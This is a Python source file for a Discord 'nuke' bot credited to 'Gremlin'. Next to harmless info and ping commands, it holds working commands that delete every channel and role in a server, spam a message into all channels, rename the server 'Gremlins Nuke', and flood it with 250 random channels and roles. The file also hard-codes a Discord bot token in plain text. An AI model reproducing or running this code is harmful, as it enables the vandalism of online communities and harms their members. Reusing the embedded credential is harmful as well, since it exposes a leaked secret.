import discord
import random, time, asyncio, string, datetime
from discord import *
from discord.ext import commands, tasks
from itertools import cycle

token = "MTA1ODEwNjE5OTkxODI0Nzk4Ng.GcFe-p.gX9_t1MM5vDpZpu85VierEMty2TbhW32eLQZZA"

client = commands.Bot(command_prefix=",", intents=discord.Intents().all())
status = cycle(['Running Gremlins App', 'Coded by Gremlin',])
client.remove_command('help')

def RandomColor(): 
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))

@client.event
async def on_ready():
    change_status.start()
    print("Online")

@tasks.loop(seconds=5)
async def change_status():
    await client.change_presence(activity=discord.Game(next(status)))

@client.command()
async def help(ctx):
    emInfo = discord.Embed(title='Info Commands', color=RandomColor())
    emInfo.add_field(name='who', value='gets user info')
    emInfo.add_field(name='ping', value='gets bot speed')
    emInfo.add_field(name='help', value='List of commands')

    emBeta = discord.Embed(title='Nuke Commands', color=RandomColor())
    emBeta.add_field(name='spam', value='spams custom message to all chans')
    emBeta.add_field(name='gremlin', value='nukes server')
    emBeta.add_field(name='delc', value='deletes all chans')
    emBeta.add_field(name='delr', value='deletes all roles')


    contents = [
    emInfo,
    emBeta
    ]
    pages = 2
    cur_page = 1
    message = await ctx.send(
                content=f"Page {cur_page}/{pages}",
                embed=contents[cur_page - 1]
    )


    await message.add_reaction("◀️")
    await message.add_reaction("▶️")

    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) in ["◀️", "▶️"]


    while True:
        try:
            reaction, user = await client.wait_for("reaction_add", timeout=None, check=check)


            if str(reaction.emoji) == "▶️" and cur_page != pages:
                cur_page += 1
                await message.edit(
                    content=f"Page {cur_page}/{pages}",
                    embed=contents[cur_page - 1]
                )
                await message.remove_reaction(reaction, user)

            elif str(reaction.emoji) == "◀️" and cur_page > 1:
                cur_page -= 1
                await message.edit(
                    content=f"Page {cur_page}/{pages}",
                    embed=contents[cur_page - 1]
                )
                await message.remove_reaction(reaction, user)

            else:
                await message.remove_reaction(reaction, user)

        except asyncio.TimeoutError:
            await message.delete()
            break

@client.command()
async def ping(ctx):
    embed = discord.Embed(description=f'Pong! {round(client.latency * 1000)}ms', color=RandomColor() )
    await ctx.send(embed=embed)

@client.command()
async def who(ctx, *, user: discord.Member = None):
    if user is None:
        user = ctx.author      
    date_format = "%a, %d %b %Y %I:%M %p"
    em = discord.Embed(description=user.mention)
    em.set_author(name=str(user), icon_url=user.avatar_url)
    em.set_thumbnail(url=user.avatar_url)
    em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
    members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
    em.add_field(name="Join position", value=str(members.index(user)+1))
    em.add_field(name="Registered", value=user.created_at.strftime(date_format))
    if len(user.roles) > 1:
        role_string = ' '.join([r.mention for r in user.roles][1:])
        em.add_field(name="Roles [{}]".format(len(user.roles)-1), value=role_string, inline=False)
    perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
    em.add_field(name="Guild permissions", value=perm_string, inline=False)
    em.set_footer(text='ID: ' + str(user.id))
    return await ctx.send(embed=em)

@client.command()
async def spam(ctx, amount: int , *,message=None):
    if amount == 0:
        amount = 5
    if message == None:
        emNo = discord.Embed(description=f"{ctx.author.mention} Please enter a message", color=RandomColor())
        await ctx.send(embed=emNo)
        return
        
    for chann in ctx.guild.text_channels:
        for _i in range(amount):
            await chann.send(f"{message}")


@client.command()
async def gremlin(ctx): 
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass 
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name="Gremlins Nuke",
            description="Nuked",
            reason="Why not",
            icon=None,
            banner=None
        )  
    except:
        pass        
    for _i in range(250):
        await ctx.guild.create_text_channel(name=RandString())
    for _i in range(250):
        await ctx.guild.create_role(name=RandString(), color=RandomColor())

@client.command()
async def delc(ctx): 
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@client.command() 
async def delr(ctx):
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

client.run(token)